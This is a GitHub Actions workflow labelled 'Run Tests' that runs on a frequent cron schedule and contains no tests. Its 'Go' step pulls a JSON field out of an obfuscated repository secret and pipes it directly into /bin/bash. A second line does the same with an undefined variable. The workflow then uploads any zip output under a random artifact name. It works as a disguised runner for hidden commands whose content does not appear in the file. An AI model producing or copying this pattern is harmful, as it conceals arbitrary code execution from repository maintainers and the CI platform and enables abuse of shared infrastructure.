name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '59 4,10,16,22 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          sukmk6822: ${{ secrets.sukmk6822 }}
        run: |
          printf '%s' "$sukmk6822" | jq -r .uv4011 | /bin/bash
          printf '%s' "$u29812" | jq -r .eaqz6594 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: QpFQ5ncw
          path: "*.zip"
          retention-days: 1
